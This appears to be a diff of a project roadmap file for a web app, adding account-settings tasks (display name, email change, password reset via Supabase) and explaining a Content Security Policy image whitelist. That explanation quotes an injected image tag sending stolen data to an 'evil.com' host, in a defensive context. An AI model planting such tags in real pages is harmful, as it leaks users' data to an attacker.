@@ -42,7 +42,17 @@ Earlier commit said "working on mobile view" — components exist in `src/compon
 ### 7. Add tests for `utils/csv.ts`
 The CSV utility is a perfect first test target — pure functions, clear inputs/outputs. Whenever you regress a CSV import this is the obvious thing to set up.
 
-### 8. Expand the CSP `img-src` whitelist when adding new poster sources
+### 8. Account settings: change display name
+Add a "Display name" field to Settings → Account that updates `profiles.name`. Trivial — one input, one `supabase.from('profiles').update({ name })` call, toast on success/failure. Demo mode can update locally (mockUsers).
+
+### 9. Account settings: change email (for email-based accounts only)
+Add a "Change email" flow that calls `supabase.auth.updateUser({ email: newEmail })`. Supabase sends confirmation to BOTH old and new addresses by default. Hide this option for username-only accounts (no real email to send to — detect via `isSyntheticEmail`). Medium effort.
+
+### 10. Account settings: reset password
+- For email accounts: trigger `supabase.auth.resetPasswordForEmail(email, { redirectTo })` and add a password-reset landing page that calls `updateUser({ password })`. Needs `redirectTo` configured for the deployed URL.
+- For username-only accounts: no recovery is possible (no email to send to). Show a clear "not available — passwords for username-only accounts cannot be reset." If users want to enable recovery, offer to add an email to their account first (depends on #9). Medium-to-high effort.
+
+### 11. Expand the CSP `img-src` whitelist when adding new poster sources
 `index.html` line 7 currently allows poster images from `'self'`, `https://image.tmdb.org`, and inline `data:` URIs only. This is intentionally tight to prevent data exfiltration via injected `<img src="https://evil.com/log?stolen=...">`. When you let users add posters from other hosts (IMDB, personal photo URLs, etc.), add those hosts to `img-src`. Any image not on the whitelist will silently fail to load.
 
 ---
